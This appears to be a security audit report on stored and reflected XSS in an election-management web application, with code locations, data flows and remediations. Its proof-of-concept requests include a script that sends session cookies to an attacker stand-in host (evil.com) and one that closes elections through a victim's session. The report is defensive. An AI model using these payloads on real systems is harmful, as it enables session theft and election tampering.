## ASVS-1.3.5: Scriptable/Expression Template Language Content Sanitization

### Findings for 1.3.5

#### HIGH
**Finding ID:** ASVS-135-HIGH-001
**Location:** `v3/server/pages.py`, function `rewrite_description`, line 49; rendered in templates without encoding
**Description:** User-supplied issue descriptions containing HTML, CSS, or JavaScript are stored and rendered as raw HTML to other users without any sanitization or output encoding.

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    # Wrap in <pre>
    issue.description = f'<pre>{desc}</pre>'
```

In `manage.ezt` (line 226):
```html
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

**Data flow:** Authenticated committer → `do_add_issue_endpoint`/`do_edit_issue_endpoint` → `form.description` stored in DB unsanitized → `manage_page`/`vote_on_page` retrieves description → EZT template renders `[issues.description]` as raw HTML → victim's browser executes scripts.

**Proof of concept:**
```
POST /do-add-issue/<eid>
Content-Type: application/x-www-form-urlencoded

title=Legitimate+Issue&description=<style>body{display:none}</style><script>fetch('/do-close/TARGET_EID')</script>
```

Another committer viewing the election management page would have the injected CSS/JS executed, potentially closing elections or stealing session data.

**Impact:** Stored XSS allows any committer to:
- Execute arbitrary JavaScript in other committers' sessions
- Manipulate elections (open/close) via the victim's session
- Exfiltrate session cookies or CSRF tokens
- Inject CSS that hides/modifies UI elements to deceive voters

**Remediation:**
```python
import html as html_module
import bleach  # or similar HTML sanitizer

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'br', 'p', 'ul', 'ol', 'li']
ALLOWED_ATTRS = {'a': ['href']}

def sanitize_description(description):
    """Sanitize user-supplied description, allowing only safe HTML."""
    return bleach.clean(description, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)

def rewrite_description(issue):
    """Rewrite issue description: sanitize, wrap in <pre> and convert doc:filename to links."""
    import re
    desc = html_module.escape(issue.description)  # Escape first
    def repl(match):
        filename = html_module.escape(match.group(1))
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

#### HIGH
**Finding ID:** ASVS-135-HIGH-002
**Location:** `v3/server/templates/manage.ezt`, line 218
**Description:** Issue titles are rendered without HTML encoding in the main issues list, enabling stored XSS via crafted title content.

```html
<strong>[issues.title]</strong>
```

Meanwhile, the SAME data IS encoded when used in JavaScript contexts (line 219-220):
```html
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

**Gap Type:** Type B — The encoding control (`[format "js,html"]`) EXISTS and is applied in JavaScript contexts but is NOT applied in the HTML body context for the same data.

**Data flow:** Committer submits title via `do_add_issue_endpoint` with `form.title` → stored unsanitized → rendered as `[issues.title]` in `<strong>` tag without encoding → XSS.

**Proof of concept:**
```
POST /do-add-issue/<eid>
Content-Type: application/x-www-form-urlencoded

title=<img+src=x+onerror=alert(document.cookie)>&description=normal
```

**Impact:** Any authenticated user viewing the election management page would execute attacker-controlled JavaScript.

**Remediation:** Apply HTML encoding consistently:
```html
<strong>[format "html"][issues.title][end]</strong>
```

#### HIGH
**Finding ID:** ASVS-135-HIGH-003
**Location:** `v3/server/pages.py`, lines 425, 487, 513; flash messages with user-controlled content
**Description:** Flash messages include unsanitized user-supplied content (election titles, issue titles) that may be rendered without encoding in the flash template.

```python
await flash_success(f'Created election: {form.title}')  # line 425
await flash_success(f'Issue "{form.title}" has been added.')  # line 487
await flash_success(f'Issue "{form.title}" has been updated.')  # line 513
```

**Data flow:** User-supplied `form.title` → interpolated into flash message → stored in session → retrieved in `basic_info()` → passed to template as `flashes.message` → likely rendered as raw HTML.

**Proof of concept:**
```
POST /do-create-election
Content-Type: application/x-www-form-urlencoded

title=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

After redirect, the flash message renders the script in the victim's browser (the creator themselves, or via CSRF on the creation endpoint).

**Impact:** Reflected/stored XSS through flash messages.

**Remediation:**
```python
import html as html_module

await flash_success(f'Created election: {html_module.escape(form.title)}')
```

Or ensure the flash template applies encoding:
```html
[for flashes]
<div class="alert alert-[flashes.category]">[format "html"][flashes.message][end]</div>
[end]
```

#### MEDIUM
**Finding ID:** ASVS-135-MED-001
**Location:** `v3/server/pages.py`, function `rewrite_description`, line 55
**Description:** The `doc:filename` regex replacement does not HTML-encode the captured filename before injecting it into an HTML attribute, allowing attribute injection.

```python
def repl(match):
    filename = match.group(1)
    return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
desc = re.sub(r'doc:([^\s]+)', repl, desc)
```

**Data flow:** Description containing `doc:x"onmouseover="alert(1)` → regex captures `x"onmouseover="alert(1)` → inserted into href attribute → attribute breakout.

**Proof of concept:** Issue description set to:
```
See doc:x"onclick="alert(1)" data-x="
```

Results in:
```html
<a href="/docs/IID/x"onclick="alert(1)" data-x="">x"onclick="alert(1)" data-x="</a>
```

**Impact:** Attribute injection enabling XSS through crafted document reference syntax.

**Remediation:**
```python
from urllib.parse import quote as url_quote
import html as html_module

def repl(match):
    filename = match.group(1)
    safe_href = url_quote(filename, safe='')
    safe_display = html_module.escape(filename)
    return f'<a href="/docs/{issue.iid}/{safe_href}">{safe_display}</a>'
```

## Cross-cutting Architecture Observations

1. **Output Encoding Inconsistency (Type B Gap Pattern):** The EZT templating system provides the `[format "js,html"]` encoding directive, and developers correctly apply it in JavaScript contexts. However, the same data (issue titles, descriptions, election titles) is rendered WITHOUT encoding in HTML body contexts. This represents a systematic Type B gap where the control exists but is not consistently applied.

2. **No Input Sanitization Layer:** The application has no centralized input sanitization for user-supplied content. Issue titles, descriptions, and election titles flow directly from form input to database storage to template rendering without any intermediate sanitization step.

3. **Defense-in-Depth Absence:** The application relies solely on authentication (`@asfquart.auth.require`) for security. There is no:
   - Content Security Policy (CSP) headers
   - Input sanitization middleware
   - Output encoding applied by default
   - CSRF token validation (acknowledged as placeholder)

4. **Privileged User Attack Surface:** While all endpoints require authentication (committer or PMC member), the stored XSS vulnerabilities mean any compromised or malicious insider can attack all other users of the system. In an election/voting context, this is particularly severe as it could undermine election integrity.

5. **Template Engine Choice:** EZT does not auto-escape by default (unlike Jinja2's `autoescape=True`). This architectural choice places the burden on developers to manually encode every output point, which has demonstrably led to gaps.

---

## Cross-cutting Recommendations

### Immediate (address before next deployment)
1. **Apply `[format "html"]` to ALL user-derived template variables** in HTML contexts — at minimum: `[issues.title]`, `[issues.description]`, `[e_title]`, `[flashes.message]`.
2. **HTML-escape content in `rewrite_description()`** before wrapping in `<pre>` tags and before constructing `<a>` attributes.
3. **Sanitize flash messages** — escape `form.title` and similar user input before interpolating into flash strings.

### Short-term (within next sprint)
4. **Implement a Content Security Policy** header (`script-src 'self'`) to mitigate XSS impact even if encoding is missed.
5. **Add `X-Content-Type-Options: nosniff`** to document responses from `serve_doc()` to prevent MIME-type sniffing of uploaded files.
6. **Restrict served document types** in `serve_doc()` to a whitelist of safe extensions (PDF, TXT, PNG, etc.), blocking SVG and HTML.
7. **Implement input sanitization** for issue descriptions — either use a library like `bleach` to allow safe HTML subset, or store as plain text and render encoded.

### Long-term (architectural improvements)
8. **Migrate from EZT to a template engine with auto-escaping** (e.g., Jinja2 with `autoescape=True`). This eliminates the class of bugs where developers forget to encode.
9. **Implement a centralized input validation/sanitization layer** as middleware that processes all form submissions before they reach handlers.
10. **Implement real CSRF protection** — the placeholder token provides zero security and creates false confidence (Type B gap at the architecture level).
11. **Add security-focused integration tests** that attempt XSS payloads through each input field and verify they are neutralized in rendered output.
